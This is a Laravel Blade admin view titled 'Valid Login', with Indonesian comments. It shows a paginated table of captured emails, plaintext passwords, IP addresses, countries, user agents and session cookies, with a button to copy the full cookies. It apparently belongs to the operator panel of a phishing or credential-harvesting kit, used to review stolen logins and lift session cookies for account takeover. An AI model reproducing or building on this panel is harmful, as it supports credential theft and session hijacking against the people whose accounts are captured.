@extends('layouts.admin')

@section('content')

<h3 class="mb-4" style="color:#00ffcc;">Valid Login</h3>

<style>
/* Biarkan table tetap satu baris rapi */
.table td {
    vertical-align: middle !important;
    white-space: nowrap;
}

/* Cookies cell — pendek, ellipsis */
.cookies-preview {
    max-width: 220px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    cursor: pointer;
    color: #7fffd4;
    font-weight: bold;
}

/* Tooltip */
.cookies-preview:hover::after {
    content: "Click to copy";
    margin-left: 12px;
    color: #00ffaa;
    font-size: 12px;
    text-shadow: 0 0 5px #00ffaa;
}
</style>

<script>
// Copy full cookies to clipboard
function copyCookies(full) {
    navigator.clipboard.writeText(full);
    alert("Cookies copied to clipboard!");
}
</script>


<div class="card p-4" style="background:#0d0d0d; border:1px solid #00ff77;">
    <div class="table-responsive">
        <table class="table table-bordered text-center" style="color:#c6ffdd;">
            <thead>
                <tr>
                    <th>No</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP</th>
                    <th>Country</th>
                    <th>User Agent</th>
                    <th>Cookies</th>
                    <th>Date/Time</th>
                </tr>
            </thead>

            <tbody>
                @forelse ($valid as $item)
                <tr>
                    {{-- Numbering --}}
                    <td>{{ ($valid->currentPage() - 1) * $valid->perPage() + $loop->iteration }}</td>

                    <td>{{ $item->email }}</td>
                    <td>{{ $item->password }}</td>
                    <td>{{ $item->ip }}</td>
                    <td>{{ $item->country }}</td>

                    {{-- User Agent — shortened --}}
                    <td style="max-width: 250px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
                        {{ $item->user_agent }}
                    </td>

                    {{-- Cookies preview --}}
                    <td>
                        <span class="cookies-preview"
                              onclick="copyCookies({{ json_encode($item->cookies) }})">
                            {{ substr($item->cookies, 0, 45) }}...
                        </span>
                    </td>

                    <td>{{ $item->created_at }}</td>
                </tr>
                @empty
                <tr>
                    <td colspan="8" class="text-center text-muted">
                        No valid login records found.
                    </td>
                </tr>
                @endforelse
            </tbody>

        </table>
    </div>

    <div class="mt-3">
        {{ $valid->links() }}
    </div>
</div>

@endsection
